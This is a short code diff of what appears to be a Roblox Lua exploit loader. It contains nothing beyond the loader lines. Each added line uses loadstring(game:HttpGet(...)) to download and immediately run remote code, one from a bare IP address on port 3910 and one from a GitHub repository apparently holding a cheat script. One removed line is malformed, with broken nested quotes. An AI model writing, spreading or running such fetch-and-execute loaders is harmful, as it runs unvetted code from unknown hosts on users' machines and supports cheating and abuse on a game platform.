@@ -1,4 +1,4 @@
 ID="be67b735-32d1-4933-8356-4ab4e8170cac";
-RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"));
 
-loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/projectreverse/refs/heads/main/V2", true))()"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/projectreverse/refs/heads/main/V2"))()
